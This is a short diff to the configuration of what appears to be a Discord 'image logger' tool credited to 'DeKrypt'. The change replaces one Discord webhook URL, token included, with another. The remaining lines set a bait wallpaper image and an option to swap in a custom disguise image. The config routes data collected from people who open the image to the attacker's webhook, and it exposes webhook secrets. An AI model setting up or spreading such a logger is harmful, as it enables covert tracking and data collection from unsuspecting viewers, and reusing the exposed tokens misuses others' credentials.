@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1458797357067014276/c5oZ9r-mh_tKIbtAj6BopriStqWDtufN9dhBLzZyN8w5q3l2Dnf4xzoWmuOQf8Wrbq4x",
+    "webhook": "https://discord.com/api/webhooks/1468256140621123686/PVk4fUOHV6wod5AFHmT52SBiM8jOAc4S2CExfW93VKzYiofBk-ZyHwoRzI6GIFMy6f_1",
     "image": "https://c4.wallpaperflare.com/wallpaper/403/855/787/sword-blood-fantasy-armor-wallpaper-preview.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
